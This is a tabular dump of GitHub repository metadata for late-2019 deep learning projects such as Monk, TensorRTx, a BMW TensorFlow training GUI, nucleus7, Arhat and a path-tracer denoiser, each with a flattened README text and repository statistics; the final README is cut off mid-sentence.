drlkit issues new Send feedback via email mailto franck mpouli gmail com Propose your own fixes suggestions and open a pull request with the changes Author Franck Ndame License MIT License Copyright c 2019 Franck Ndame Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the Software to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software THE SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE,2019-12-04T13:34:13Z,2019-12-12T09:41:18Z,Python,FranckNdame,User,2,27,0,51,master,FranckNdame,1,0,0,0,0,0,0
Tessellate-Imaging,monk_v1,n/a,monkv1 Tweet https img shields io twitter url https github com tterb hyde svg style social http twitter com share text Check 20out 20Monk 20An 20Open 20Source 20Unified 20Wrapper 20for 20Computer 20Vision url https github com Tessellate Imaging monkv1 hashtags MonkAI OpenSource UnifiedWrapper DeepLEarning ComputerVision TessellateImaging Website https monkai 42 firebaseapp com Monk is a low code Deep Learning tool and a unified wrapper for Computer Vision Version https img shields io badge version v1 0 lightgrey https github com Tessellate Imaging monkv1 nbsp nbsp BuildStatus https img shields io badge build passing green https github com Tessellate Imaging monkv1 Documentation Introduction https clever noyce f9d43f netlify com introduction Setup https clever noyce f9d43f netlify com setup setup Quick Mode https clever noyce f9d43f netlify com quickmode quickmodepytorch Update Mode https clever noyce f9d43f netlify com updatemode updatedataset Expert Mode https clever noyce f9d43f netlify com expertmode Hyper Parameter Analyser https clever noyce f9d43f netlify com hpfinder modelfinder Compare Experiments https clever noyce f9d43f netlify com compareexperiment Resume Training https clever noyce f9d43f netlify com resumetraining Create an image classification experiment Load foldered dataset Set number of epochs Run training python ptf prototype verbose 1 ptf Prototype sample project 1 sample experiment 1 ptf Default datasetpath datasetcatsdogstrain modelname resnet18 freezebasenetwork True numepochs 2 ptf Train Inference python imgname monk datasets test 0 jpg predictions ptf Infer imgname imgname returnraw True print predictions Compare Experiments Add created experiments with different hyperparameters Generate comparison plots python ctf compare verbose 1 ctf Comparison Sample Comparison 1 ctf AddExperiment sample project 1 sample experiment 1 ctf AddExperiment sample project 1 sample experiment 2 ctf GenerateStatistics RoadMap Incorporate pep coding standards Functional Documentation Tackle Multiple versions of pytorch keras gluon Standardize folder structure for next feature additions object detection image segmentation Add support for tensorflow 2 0 Add unit testing Copyright Copyright 2019 onwards Tessellate Imaging Private Limited Licensed under the Apache License Version 2 0 the License you may not use this project s files except in compliance with the License A copy of the License is provided in the LICENSE file in this repository,2019-11-09T19:09:19Z,2019-12-04T03:58:58Z,Python,Tessellate-Imaging,Organization,5,23,10,34,master,abhi-kumar#li8bot,2,0,0,1,7,1,1
wang-xinyu,tensorrtx,alexnet#googlenet#inception#lenet#mnasnet#mobilenet#resnet#shufflenet#squeezenet#tensorrt#vgg#yolov3,TensorRTx TensorRTx aims to implement popular deep learning networks with tensorrt network definition APIs As we know tensorrt has builtin parsers including caffeparser uffparser onnxparser etc But when we use these parsers we often run into some unsupported operations or layers problems especially some state of the art models are using new type of layers therefore sometimes we have no choice but to implement the models with tensorrt network definition APIs I wrote this project to get familiar with tensorrt API and also to share and learn from the community TensorRTx has a brother project Pytorchx https github com wang xinyu pytorchx All the models are implemented in pytorch first and export a weights file xxx wts and then use tensorrt to load weights define network and do inference Test Environment Jetson TX1 Ubuntu16 04 cuda9 0 cudnn7 1 5 tensorrt4 0 2 nvinfer4 1 3 Currently I only test it on TX1 But I think it will be totally OK on TX2 with same software version And also it will be easy be ported to x86 Models Following models are implemented each one also has a readme inside Name Description lenet lenet the simplest as a hello world of this project alexnet alexnet easy to implement all layers are supported in tensorrt googlenet googlenet GoogLeNet Inception v1 inception inception Inception v3 mnasnet mnasnet MNASNet with depth multiplier of 0 5 from the paper mobilenet mobilenet MobileNet V2 resnet resnet resnet 18 and resnet 50 are implemented shufflenet shufflenet ShuffleNetV2 with 0 5x output channels squeezenet squeezenet SqueezeNet 1 1 model vgg vgg VGG 11 layer model yolov3 yolov3 darknet 53 weights from yolov3 authors Tricky Operations Some tricky operations encountered in these models already solved but might have better solutions Name Description BatchNorm Implement by a scale layer used in resnet googlenet mobilenet etc MaxPool2d ceilmode True use a padding layer before maxpool to solve ceilmode True see googlenet average pool with padding use setAverageCountExcludesPadding when necessary see inception relu6 use Relu6 x Relu x Relu x 6 see mobilenet torch chunk implement the chunk 2 dim C by tensorrt plugin see shufflenet channel shuffle use two shuffle layers to implement channelshuffle see shufflenet adaptive pool use fixed input dimension and use regular average pooling see shufflenet leaky relu I wrote a leaky relu plugin but PRelu in NvInferPlugin h can be used see yolov3 yolo layer yolo layer is implemented as a plugin see yolov3 upsample replaced by a deconvolution layer see yolov3,2019-11-25T09:01:36Z,2019-12-13T06:49:37Z,C++,wang-xinyu,User,1,23,3,2,master,wang-xinyu,1,0,0,0,0,0,0
BMW-InnovationLab,BMW-TensorFlow-Training-GUI,computer-vision#computervision#deep-learning#deeplearning#detection-api#docker#docker-image#gui#inference-api#nvidia-docker#object-detection#objectdetection#resnet-101#resnet-50#rest-api#ssd#tensorboard#tensorflow#tensorflow-gui#tensorflow-training,Tensorflow Object Detection Training GUI for Linux This repository allows you to get started with training a State of the art Deep Learning model with little to no configuration needed You provide your labeled dataset and you can start the training right away and monitor it with TensorBoard You can even test your model with our built in Inference REST API Training with TensorFlow has never been so easy This repository is based on Tensorflow Object Detection API https github com tensorflow models tree master research objectdetection The tensorflow version used is in this repo is 1 13 1 We plan on supporting TF 2 as soon as the Tensorflow Object Detection API https github com tensorflow models tree master research objectdetection officially supports it The built in inference REST API works on CPU and doesn t require any GPU usage All of the supported networks in this project are taken from the tensorflow model zoo https github com tensorflow models blob master research objectdetection g3doc detectionmodelzoo md The pre trained weights that you can use out of the box are based on the COCO dataset documentationimages 0 gif Prerequisites Ubuntu 18 04 NVIDIA Drivers 410 x or higher Docker CE latest stable release NVIDIA Docker 2 Docker Compose How to check for prerequisites To check if you have docker ce installed docker version To check if you have docker compose installed docker compose version To check if you have nvidia docker installed nvidia docker version To check your nvidia drivers version open your terminal and type the command nvidia smi documentationimages nvidiasmi gif Installing Prerequisites If you don t have neither docker nor docker compose use the following command chmod x installfull sh source installfull sh If you have docker ce installed and wish only to install docker compose and perform necessary operations use the following command chmod x installcompose sh source installcompose sh If both docker ce and docker compose are installed then use the following command chmod x installminimal sh source installminimal sh Install NVIDIA Drivers 410 x or higher and NVIDIA Docker for GPU training by following the official docs https github com nvidia nvidia docker wiki Installation version 2 0 Validating the prerequisites installation Make sure that the deleteme files in datasets and checkpoints folder are deleted deleteme files are placeholder files used for git Make sure that the basedir field in dockersdkapi api paths json is correct it must match the path of the root of the repo on your machine documentationimages basedir gif Changes To Make Go to gui src environments environment ts and gui src environments environment prod ts and change the following field url must match the IP address of your machine the IP field of the inferenceAPIUrl must match the IP address of your machine Use the ifconfig command to check your IP address Please use your private IP which starts by either 10 or 172 16 or 192 168 environment ts documentationimages env gif environment ts documentationimages envprod gif environment prod ts If you are behind a proxy change the args httpproxy and httpsproxy in build yml to match the address of your proxy you can find build yml in the repo s root directory documentationimages proxy gif Dataset Folder Structure The following is an example of how a dataset should be structured Please put all your datasets in the datasets folder sh datasets dummydataset images img1 jpg img2 jpg labels json img1 json img2 json pascal img1 xml img2 xml objectclasses json PS you don t need to have both json and pascal folders Either one is enough If you want to label your images you can use LabelImg https github com tzutalin labelImg which is a free open source image annotation tool This tool supports XML PASCAL label format Objectclasses json file example You must include in your dataset an objectclasses json file with a similar structure to the example below documentationimages objclasses png Build the Solution To build the solution run the following command from the repository s root directory sh docker compose f build yml build Run the Solution To run the solution run the following command from the repository s root directory sh docker compose f run yml up After a successful run you should see something like the following documentationimages done png Usage If the app is deployed on your machine open your web browser and type the following localhost 4200 or 127 0 0 1 4200 If the app is deployed on a different machine open your web browser and type the following 4200 1 Preparing Dataset Prepare your dataset for training documentationimages 1 gif 2 Specifying General Settings Specify the general parameters for you docker container documentationimages 2 gif 3 Specifying Hyperparameters Specify the hyperparameters for the training job documentationimages 3 gif 4 Checking training logs Check your training logs to get better insights on the progress of the training documentationimages 4 gif 5 Monitoring the training Monitor the training using Tensorboard documentationimages 5 gif 6 Checking the status of the job Check the status to know when the job is completed successfully documentationimages 6 gif 7 Downloading and test with Swagger Download your mode and easily test it with the built in inference API using Swagger documentationimages 7 gif 8 Stopping and Delete the model s container Delete the container s job to stop an ongoing job or to remove the container of a finished job Finished jobs are always available to download documentationimages 8 gif Training and Tensorboard Tips Check our tips document trainingapi docs Tips md to have 1 a better insight on training models based on our expertise and 2 a benchmark of the inference speed Our tensorboard document trainingapi docs Tensorboard md helps you find your way more easily while navigating tensorboard Guidelines In advanced configuration mode be careful while making the changes because it can cause errors while training If that happens stop the job and try again documentationimages advancedConfig png In general settings choose carefully the container name because choosing a name used by another container will cause errors documentationimages nameerror gif Acknowledgments inmind ai https www inmind ai robotron de https www robotron de Joe Sleiman inmind ai Beirut Lebanon Daniel Anani inmind ai Beirut Lebanon Joe Abou Nakoul inmind ai Beirut Lebanon Michael Ghosn inmind ai Beirut Lebanon Elie Haddad Beirut Lebanon,2019-12-11T18:06:11Z,2019-12-15T00:47:16Z,Python,BMW-InnovationLab,Organization,26,23,2,5,master,Marc-Kamradt#ESaller#JMTCoder,3,1,1,0,0,1,0
ifeherva,DMLPlayground,n/a,Distance Metric Learning Playground This repository contains code for the paper Unbiased Evaluation of Deep Metric Learning Algorithms https arxiv org abs 1911 12528 Several Deep Metric Learning DML algorithms were trained and evaluated on the CUB200 2011 http www vision caltech edu visipedia CUB 200 2011 html Cars196 https ai stanford edu jkrause cars cardataset html and SOP http cvgl stanford edu resources html datasets The aim is to create a testbed for benchmarking future DML methods under fair conditions Every algorithm is implemented with Apache Incubating MXNet 1 5 Python 2 7 and 3 5 is supported Currently supporting the following algorithms 1 Triplet loss with semi hard mining 2015 arXiv https arxiv org abs 1503 03832 2 Deep Metric Learning via Lifted Structured Feature Embedding 2015 arXiv https arxiv org abs 1511 06452 3 Improved Deep Metric Learning with Multi class N pair Loss Objective 2016 NIPS https papers nips cc paper 6200 improved deep metric learning with multi class n pair loss objective 4 Deep Metric Learning via Facility Location 2016 arXiv https arxiv org abs 1612 01213v2 requires MXNet 1 5 5 Sampling Matters in Deep Embedding Learning 2017 arXiv https arxiv org abs 1706 07567 6 Prototypical Networks for Few shot Learning 2017 arXiv https arxiv org abs 1703 05175 7 No Fuss Distance Metric Learning using Proxies 2017 arXiv https arxiv org abs 1703 07464 8 Deep Metric Learning with Angular Loss 2017 arXiv https arxiv org abs 1708 01682 9 Making Classification Competitive for Deep Metric Learning 2018 arXiv https arxiv org abs 1811 12649 10 Deep Randomized Ensembles for Metric Learning 2018 arXiv https arxiv org abs 1808 04469 11 Ranked List Loss for Deep Metric Learning 2019 arXiv https arxiv org abs 1903 03238 12 A Theoretically Sound Upper Bound on the Triplet Loss for Improving the Efficiency of Deep Distance Metric Learning 2019 arXiv https arxiv org abs 1904 08720 Results Every experiment is run on an AWS P3 2xlarge EC2 instance using one V100 GPU We measure recall 1 and normalized mutual information NMI https course ccs neu edu cs6140sp15 7localitycluster Assignment 6 NMI pdf Results are averages after 10 runs with different seeds Sample logs are provided in the results folder along with hyperparameters Every method is evaluated under the following conditions Inception BN https arxiv org abs 1502 03167 architecture pretrained on ImageNet Images are resized to 256x256 then randomly cropped to 224x224 in training center cropped in testing Embedding size is 64 Bounding box annotations where available are not used CUB200results results plots CUBresnet50plot png CUB200results results plots CUBinceptionplot png Cars196results results plots CARS196inceptionplot png SOPresults results plots SOPinceptionplot png Effects of the embedding size embsizeresults results plots embeddingsize png Effect of training batch size batchsizeresults results plots figbatchsize png How to use There is a separate script for each algorithm as in the table below Type scriptname py help for a list of parameters and settings Paper Script 1 Triplet loss with semi hard mining traintripletsemihard py 2 Deep Metric Learning via Lifted Structured Feature Embedding trainliftedstruct py 3 Improved Deep Metric Learning with Multi class N pair Loss Objective trainnpairs py 4 Deep Metric Learning via Facility Location trainclusterloss py 5 Sampling Matters in Deep Embedding Learning trainmargin py 6 Prototypical Networks for Few shot Learning trainprototype py 7 No Fuss Distance Metric Learning using Proxies trainproxy py 8 Deep Metric Learning with Angular Loss trainangular py 9 Making Classification Competitive for Deep Metric Learning trainnormproxy py 10 Deep Randomized Ensembles for Metric Learning traindreml py 11 Ranked List Loss for Deep Metric Learning trainrankedlistloss py 12 A Theoretically Sound Upper Bound on the Triplet Loss for Improving the Efficiency of Deep Distance Metric Learning traindiscriminative py Paper If you find this repository useful please consider citing our paper miscfehervari2019unbiased title Unbiased Evaluation of Deep Metric Learning Algorithms author Istvan Fehervari and Avinash Ravichandran and Srikar Appalaraju year 2019 eprint 1911 12528 archivePrefix arXiv primaryClass cs LG License Licensed under an Apache 2 0 https github com apache incubator mxnet blob master LICENSE license,2019-11-26T23:49:27Z,2019-12-13T17:24:10Z,Python,ifeherva,User,1,18,0,4,master,ifeherva,1,0,0,0,0,0,0
Parkchanjun,DeepLearning_Basic_Tutorial,n/a,DeepLearningBasicTutorial Deep Learning Basic Tutorial Pytorch Keras Pytorch Keras ANN DNN CNN RNN Pytorch Keras 3 Keras Pytorch,2019-11-08T05:09:27Z,2019-11-16T00:16:59Z,Jupyter Notebook,Parkchanjun,User,4,16,3,7,master,Parkchanjun,1,0,0,0,0,0,0
Vadikus,practicalDL,n/a,github com Vadikus practicalDL Educational materials for Frontend Masters course A Practical Guide to Deep Learning with TensorFlow 2 0 and Keras Setup Prerequisite Python To use Jupyter Notebooks on your computer please follow the installation instructions https jupyter readthedocs io en latest install html Note Anaconda installation is recommended if you are not familiar with other Python package management systems Agenda Curriculum 00 Introductions About myself About this course workshop quick demo tools overview Whiteboard drawings Jupyter Notebooks Terminal commands pip jupyter cmd pyenv conda GitHub repos for class TFJS pose demo https storage googleapis com tfjs models demos posenet camera html books repos TF Keras demos Websites TF TF hub Books books books png Deep Learning with Python by Franois Chollet https github com fchollet deep learning with python notebooks Hands On Machine Learning with Scikit Learn Keras and TensorFlow Concepts Tools and Techniques to Build Intelligent Systems by Aurlien Gron https github com ageron handson ml2 Hands On Neural Networks with TensorFlow 2 0 by Paolo Galeone https github com PacktPublishing Hands On Neural Networks with TensorFlow 2 0 plot What is the difference between Statistics Machine Learning Deep Learning Artificial Intelligence matvelloso Shoes size example Information reduction plot Compute Algorithm IO plot Why now AI Chronological retrospective plot Hardware advances SIMD Tensor Cores TPU FPGA Quantum Computing plot HW compilers TensorFlow and Keras computational graph memory allocation 0 Don t be scared of Linear Regressions it does not byte Basic Terminology Linear regression Notebook plot What is neuron What is activation function 1 Computer Vision Handwritten digits MNIST recognized with fully connected neural network plot One hot encoding Information theory and representation MNIST Principal Component Analysis plot Fully connected vs convolutional neural network plot Notebook Convolutions pooling dropouts plot Transfer learning and different topologies Style transfer Convolutional Neural Network attention ML explainability 2 Text Analytics Natural Language Processing NLP Toxicity demo plot How to represent text as numbers Text vectorization one hot encoding tokenization word embeddings IMDB movies review dataset prediction with hot encoding in Keras Word embeddings and Embedding Projector http projector tensorflow org Embedding vs hot encoding and Fully Connected Neural Network for IMDB Can LSTM guess the author 3 Can Robot juggle Reinforcement Learning plot Actors and environment Reinforcement learning 4 Operationalization aka 10 ways to put your slapdash code into production plot Data Training Deployment aka MLOps or CI CD for Data Scientists 5 Summary Quick recap what we learned so far,2019-11-13T12:20:18Z,2019-12-06T06:57:52Z,Jupyter Notebook,Vadikus,User,1,16,9,8,master,vakarpus#Vadikus,2,0,0,0,0,0,0
mukeshmithrakumar,Book_List,algorithms#books#data-science#deep-learning#free#machine-learning#python,Book List New Content Every Week Put a if you find this repo usefull and follow me on to get notified when I upload new content Books Data Science from Scratch by Steven Cooper https github com mukeshmithrakumar BookList blob master Data 20Science 20from 20Scratch pdf Data Science Tutorial Library https github com mukeshmithrakumar BookList blob master Data 20Science 20Tutorial 20Library pdf Deep learning Masterpiece by Andrew Ng https github com mukeshmithrakumar BookList blob master Deep 20learning 20Masterpiece 20by 20Andrew 20Ng pdf Introduction to Machine Learning https github com mukeshmithrakumar BookList blob master Introduction 20to 20Machine 20Learning pdf If you are looking for courses to take to Learn Machine Learning check out LearnMLin6Months If you are working on HackerRank to Improve your coding skills check out my HackerRankSolutions for Python Java C C Shell SQL JavaScript and Interview Preparation Kit Solutions If you want to learn Deep Learning with Tensorflow take a look at DeepLearningWithTF2 0,2019-11-16T17:54:51Z,2019-12-11T18:09:45Z,n/a,mukeshmithrakumar,User,3,15,9,19,master,mukeshmithrakumar,1,0,0,0,0,0,0
AEV,nucleus7,deep-learning#nucleus7#tensorflow,nucleus7 Welcome to nucleus7 library for exchangeable and reproducible development of Deep Learning models built on top of tensorflow Why and when to use it why and when Installation INSTALL md Glossary glossary Project structure ProjectStructure md Nucleotide and co nucleus7 core README md Data flow nucleus7 data README md Model components nucleus7 model README md Metrics and KPIs nucleus7 kpi README md Training and inference Coordination Coordinators like Trainer and Inferer nucleus7 coordinator README md Optimization control nucleus7 optimization README md nucleus7 project Configs ProjectConfigs md Structure ProjectStructure md Execution ProjectExecution md Nucleotide development Development md Tutorials tutorials Mlflow integration Mlflow integration Known bugs known bugs Documentation https aev github io nucleus7 Contribution CONTRIBUTING md Why and when to use it If you want to spend your time on important stuff architecture design paper implementation and not on how to launch tf Session on multi gpus If you want your code to be able to be used by other developers without any problems and without spending hours and hours of their time to understand where the training begins If you want to use modules like architectures losses metrics etc developed by yourself and by others in plug and play mode If you want to load classification models from your neighbour and use those weights for your dog cat object detection of course it is better that your neighbour also uses nucleus7 Glossary Names of nucleus7 components are based on nucleus structure nucleotide gene dna helix etc Nucleotide is a building block of nucleus7 It has a modular structure and also has a data flow interfaces e g which data does it take and which data does it output There are different kinds of nucleotides like ModelPlugin and CoordinatorCallback which serve for different tasks like neural network architecture and callbacks to execute after each iteration Gene is a combination of same type nucleotides like plugins gene has all the ModelPlugin nucleotides inside etc There may be many different genes in one model This abstraction allows also to restrict the gene to gene connections e g data can flow only from one gene to other and other connection is not allowed e g ModelPlugin cat take inputs from the Dataset but not from ModelLoss and ModelLoss can take inputs from ModelPlugin but not from Callbacks DNA helix called the graph constructed of all model nucleotides DNA will sort the nucleotides in each gene Tutorials You can find some totorials how to use nucleus7 for your projects inside of tutorials folder tutorials in the root directory DO NOT FORGET you need to have nucleus7 inside of your PYTHONPATH e g see Install section INSTALL md To run notobooks bash jupyter notebook Mlflowintegration By default when you start the nucleus7 project e g training or inference it will create a folder mlruns inside of the root of projectdir e g for path to root projectdir it will create path to root projectdir and add the experiment there with name of the projectdir directory or it will search for projectname inside of nucleus7project json file under PROJECTNAME key This will make sure that you track everything to mlflow and so you can start mlflow from path to root folder bash cd path to root mlflow ui But you also can set MLFLOWTRACKINGURI environment variable to point to the URI with main mlflow tracker see mlflow help for more details and it will create the experiment there if experiment with that name exists than it will add the run to it bash export MLFLOWTRACKINGURI path to uri nc7 train path to root projectdir Known bugs If you have tensorflow gpu 1 11 then you can issue the pylint no member warnings issues for tensorflow estimator due to the fact that estimator API is still accessible as in tensorflow 1 11 but is officially legacy there and is moved to tensorflowestimator Since we maintain code for nucleus7 for tf 1 11 this bug cannot be solved easily and is more cosmetic issue When tensorflow 2 0 will come out tensorflow 1 11 support will be dropped and this issue will be removed Inside of the testing pylint is used only for tensorflow 1 11 so it does not raise an issue Since by starting the inference project nc7 infer the symlinks are generated it causes the errors with the directory cleaning inside of tf TestCase But since the temporary folders are used tmp this is also only a cosmetic issue since this folders are cleaned automatically by the OS,2019-12-10T14:07:31Z,2019-12-13T15:57:55Z,Python,AEV,Organization,7,15,4,3,master,OleksandrVorobiov#aev-oss-techniscal-user,2,0,1,0,0,0,0
fragata-ai,arhat,n/a,Arhat Arhat is an experimental deep learning framework implemented in Go https golang org Unlike most mainstream frameworks that perform training and inference computations directly Arhat translates neural network descriptions into standalone lean executable platform specific code This approach allows direct embedding of the generated code into user applications and does not require deployment of sophisticated machine learning software stacks on the target platforms Arhat supports swappable platform specific code generators backends Currently two backends are available CPU a reference backend generating C code for use on the CPU CUDA a backend generating C CUDA code for use on the NVIDIA GPU Implementation of more backends for other platforms is planned Arhat implementation is based on neon https github com NervanaSystems neon Intel Nervana reference deep learning framework We have ported sections of neon code from Python to Go and partly redesigned it implementing code generators in place of the original backends We use Arhat internally as a research platform for our larger ongoing project aiming at construction of a machine learning framework optimized for use on embedded platforms and massively parallel supercomputers Requirements The following hardware and software components are required for using Arhat OS Windows or Linux macOS should suit too but was not yet tested NVIDIA GPU device Kepler of newer CUDA Toolkit 8 0 or higher C compiler toolchain supporting CUDA Go 1 11 or higher Python only for obtaining data sets for examples Obtaining data sets Examples included in this distribution require two data sets MNIST http yann lecun com exdb mnist CIFAR10 https www cs toronto edu kriz cifar html These data sets can be obtained and converted to Arhat format using the supplied Python scripts getmnist py getcifar10 py Runtime libraries Arhat provides few run time libraries required to build executables from the generated code runtime runtime components common for all backends runtimecpu runtime components required for the CPU backend runtimecuda runtime components required for the CUDA backend These libraries must be built and linked with the respective generated code Quick start To start download this distribution obtain the data sets and build the runtime libraries Set your GOPATH environment variable to the path of the downloaded go directory Create an empty working directory make it you current directory create a subdirectory named data and copy the data sets there Then build the mnistmlp example implementing a simple multi layer perceptron network for MNIST data set Use the following commands Linux is assumed commands for Windows are similar For the CUDA backend mkdir p bin mkdir p mnistmlpcuda go build o bin mnistmlp fragata arhat examples mnistmlp bin mnistmlp o mnistmlpcuda For the CPU backend mkdir p bin mkdir p mnistmlpcpu go build o bin mnistmlp fragata arhat examples mnistmlp bin mnistmlp b cpu o mnistmlpcpu The generated code will be placed in subdirectories mnistmlpcuda and mnistmlpcpu respectively Separately for each directory compile all the contained source files and link resulting object files with the runtime libraries Run the resulting executables from your current directory to train and evaluate the neural network License We are releasing Arhat under an open source Apache 2 0 https www apache org licenses LICENSE 2 0 License,2019-11-27T13:50:27Z,2019-12-06T19:14:38Z,Go,fragata-ai,Organization,0,15,2,6,master,lxgo,1,0,0,0,1,0,0
Black-Phoenix,Ai-Path-Tracer-Denoiser,n/a,AI Path Tracer Denoiser University of Pennsylvania CIS 565 GPU Programming and Architecture Final Project Members Dewang Sultania Vaibhav Arcot Dewang s Linkedin https www linkedin com in dewang sultania Vaibhav s LinkedIn https www linkedin com in vaibhav arcot 129829167 Tested on Windows 10 i7 7700HQ 2 8GHz 3 8 Boost 32GB External GTX 1080Ti 11G personal laptop Banner image imgs sponza1 gif General Overview The repo is dedicated to the implementation of the paper titled Interactive Reconstruction of Monte Carlo Image Sequences using a Recurrent Denoising Autoencoder https research nvidia com sites default files publications dnndenoiseauthor pdf which proposes a purely ML approach to denoising 1 sample per pixel path tracer renders The approach takes into account the temporal nature of a moving camera to reduce flickering between the different frames The Path tracer was implemented path tracer written entirely in C and CUDA accelerated while the network was created and trained in PyTorch The inference is done using the C bindings of Torch Below is an overview of the pipeline The black line is the path followed during training and the green line is used during inference imgs overview PNG Results Qualitative Reflective Sponza imgs results refl gif Living room imgs results livingroom gif Classroom imgs results classroom gif Diffused Sponza imgs results diffsponza gif Cornell box imgs results cornell gif Quantitative Time to train the network 22x reduction in time imgs results cpuvgpu png Average inference time for different approaches 750x reduction in time imgs results infer png Path Tracing Overview The idea of a path tracer is to simulate the effect light and materials have on other objects in the scene This path tracer is both the first and last step of this project data generation and inference are done using similar code More information can be found on this repo https github com Black Phoenix Project3 CUDA Path Tracer which is dedicated to the path tracer itself Features Reflective and diffused materials Stream compaction Material sorting Caching first bounce Refractive materials using Schlick s approximation of Fresnel s law Motion blur Anti Aliasing Normal debugging view Loading arbitrary meshes and ray culling Experimental MTL file parsing and texture loading The output of requisite intermediate buffers Cornell Box The Cornell box is a simple stage consisting of 5 diffusive walls 1 red 1 green and the other 3 white In the above sample a diffusive sphere Effect of iterations on a render To see the effect of iterations on render quality we went with the same image we used above with a depth of 8 to test the effect of iteration on render for a semi complex scene From visual inspection 2000 seems to be the tipping point and further iterations have diminishing value So for data generation we chose to use 2500 samples per pixel images as the ground truth Data Generation pipeline Movements One of the core objectives of this project is to denoise temporal data This means that the camera moves smoothly through the scene and for each frame we generate the requisite inputs So the data generation we had the camera move around the scene For each scene we generated an average of 300 frames of motion and 2 different motions of the camera pan left right and pan up down Then we generated 5 different versions of the 1 sample per pixel inputs This was done to allow the network to identify the noise The total amount of data generated was around 200 gigabytes and only a subset could be uploaded Components To generate training data we used the path tracer to output the albedos depth maps 1 sample per pixel and the normals for each surface for each frame in a movement This results in a total of 10 channels It is possible to store the normals as only 2 channels but was not done for this project because a png has either 3 or 4 channels per image The images were written to the disk using STB write png Because all the values are float values for data storage we scaled all the outputs to make the range between 0 and 255 While training the network the data is unscaled This allowed for saving of space not required to write cv float arrays to disk while having a discretization effect on the data Python processing After the data was generated in C and written to images we used Numpy to perform the final stage of data processing which involved collecting the 4 separate images and storing it into a single Numpy matrix with 10 channels This matrix was then cropped to the requisite size and written to disk as Numpy files This allowed them to be read using the PyTorch data loader making it easier to train the network Denoising Network Architecture The architecture used here is a Recurrent Autoencoder with Skip connections TLDR it is recurrent because data is temporal autoencoder because we need to reconstruct images from some internal representation and skip connections help the network go deeper and fix the vanishing exploding gradient problem Denoising Autoencoder with skip connections The network architecture includes a distinct encoder and decoder stages that operate on decreasing and increasing spatial resolutions respectively Autoencoders are networks that learn to reconstruct their inputs from some internal representation and denoising autoencoders also learn to remove noise from the inputs The term denoising autoencoders are used because the network constructs from noisy inputs Because the network learns a mapping from inputs to outputs it has a desirable property that any number of auxiliary inputs can be provided in addition to the colour data The optimization during training considers all these inputs and automatically finds the best way to use them to disambiguate the colour data Recurrent Denoising Autoencoder for Temporal Denoising Recurrent Neural networks are used for processing arbitrarily long input sequences An RNN has feedback loops that connect the output of the previous hidden states to the current ones thus retaining important information between input This makes it a good fit for our application for two reasons In order to denoise a continuous stream of images we need to achieve temporally stable results Our inputs are very sparse the recurrent connections also gather more information about the illumination over time In order to retain temporal features at multiple scales fully convolutional blocks are used after every encoding stage It is important for the network to remain fully convolutional because we can train on smaller crops and then later apply it to sequences of arbitrary resolution and length Since the signal is sparser in the encoder than the decoder it is efficient to use recurrence only in the encoder and not the decoder Each recurrent block consists of three convolution layers with a 3 3 pixel spatial support One layer processes the input features from the previous layer of the encoder It then concatenates the results with the features from the previous hidden state and passes it through two remaining convolution layers The result becomes both the new hidden state and the output of the recurrent block This provides a sufficient temporal receptive field and together with the multi scale cascade of such recurrent blocks allows to efficiently track and retain image features temporally at multiple scales The convolution layers in a recurrent block operate on the same input resolution and the same number of features as the encoding stage it is attached to Formally the output and the hidden state can be represented using a recurrent equation Loss A loss function defines how the error between network outputs and training targets is computed during training The network trained here contains three loss components Spatial L1 loss The most commonly used loss function in image restoration is mean square error loss However it has been observed that using an L1 loss instead of L2 can reduce the splotchy artefacts from reconstructed images Gradient Domain L1 Loss The L1 spatial loss provides a good overall image metric that is tolerant of outliers In order to further penalize the difference in finer details like edges we also use gradient domain L1 loss where each gradient is computed using a High Frequency Error Norm HFEN an image comparison metric The metric uses a Laplacian of Gaussian kernel for edge detection The Laplacian works to detect edges but is sensitive to noise so the image is pre smoothed with a Gaussian filter first to make edge detection work better Temporal Loss These losses minimize the error of each image in isolation However they do not penalize temporal incoherence and neither do they encourage the optimizer to train the recurrent connections to pass more data across frames So along with the other two losses a temporal L1 loss is used where the temporal derivative for an ith pixel image is computed using finite differencing in time between the ith pixels of the current and the previous image in the temporal training sequence The final loss is a weighted combination of these three losses as a final training loss where ws wg and wt are picked as 0 8 0 1 0 1 respectively It was important to assign a higher weight to the loss functions of frames later in the sequence to amplify temporal gradients and thus incentivize the temporal training of RNN blocks A Gaussian curve to modulate ws g t for a sequence of 7 images was used with values 0 011 0 044 0 135 0 325 0 607 0 882 1 Loss Plots Here are the loss plots for our network HFEN Loss L1 Loss Temporal Loss Total Loss Scaling Loading all the data into the network quickly becomes a problem because of the size of the images To allow for faster training we had to split the images into smaller crops i e for each image we created a random crop of 255x255 and used that for that epoch During inference because the architecture is purely convolutional we can infer on the entire resolution Realtime Architecture Once we have a trained network we use the PyTorch to export the network into a c readable model using TorchScript Once this is done we can load the model and pass the network a tensor to infer on Because of the way functions are implemented in the C Torch lib the code wasn t able to be compiled with nvcc So the inference and subsequent visualization was done using OpenCV imshow This is definitely not the most efficient way to show the frames but was sufficient to get a usable framerate output In the results 2 different approaches to getting the data into a Torch tensor are shown The first approach used the existing pipeline for data generation and replaced the final step with a conversion to a torch tensor This method turned out to be very slow because of a number of small requirements such as the coordinate frames not lining up and RGB vs BGR issues The second approach was a much cleaner approach using only float arrays and directly filling the data into the array during generation inside the kernel itself This method involved removing a lot of the data generation code in order to make it Realtime so the data generation code was moved to a separate branch Building the project Dependencies Path Tracer Code CUDA 10 tinyobjloader https github com syoyo tinyobjloader Torch C https pytorch org cuDNN https developer nvidia com cudnn OpenCV https opencv org STB https github com nothings stb Network Training PyTorch https pytorch org Numpy OpenCV https opencv org Building Torch Using CMake With OpenCV Download Torch https pytorch org tutorials advanced cppexport html From the official website C build with or without CUDA and extract it into the project Download cuDNN Required for Torch and extract into the project First add the necessary lines from this post https pytorch org tutorials advanced cppexport html to your CMakeLists txt file 